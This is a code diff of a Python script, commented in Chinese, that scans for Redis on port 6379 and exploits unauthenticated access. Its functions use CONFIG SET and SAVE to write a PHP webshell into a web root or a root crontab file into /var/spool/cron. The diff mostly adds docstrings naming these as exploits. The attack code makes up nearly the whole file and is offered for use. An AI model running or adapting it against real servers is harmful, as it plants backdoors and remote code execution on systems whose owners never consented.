@@ -7,7 +7,6 @@
 import socket
 import redis
 
-
 def scan_port(ip):
     """
     检查指定 IP 的 Redis 端口是否开放。
@@ -24,7 +23,6 @@ def scan_port(ip):
     except socket.error:
         print("[-] 6379 端口已关闭")
         return
-
 
 def check_redis_connect(ip):
     """
@@ -45,8 +43,12 @@ def check_redis_connect(ip):
         print(f"[-] 无法连接到 {ip}:6379")
         return
 
-
 def exp_webShell(redis_client):
+    """
+    利用 Redis 未授权访问写入 webshell。
+
+    :param redis_client: Redis 客户端对象
+    """
     root = 'D:/phpstudy_pro/WWW'
     redis_client.config_set('dir', root)
     redis_client.config_set('dbfilename', 'shell.php')
@@ -54,8 +56,12 @@ def exp_webShell(redis_client):
     redis_client.save()
     print(f"[+] webshell 写入成功")
 
-
 def exp_crontab(redis_client):
+    """
+    利用 Redis 未授权访问创建恶意定时任务。
+
+    :param redis_client: Redis 客户端对象
+    """
     root = '/var/spool/cron'
     redis_client.config_set('dir', root)
     redis_client.config_set('dbfilename', 'root')
@@ -63,6 +69,3 @@ def exp_crontab(redis_client):
     redis_client.save()
     print(f"[+] 定时任务已创建")
 
-
-if __name__ == '__main__':
-    scan_port('127.0.0.1')
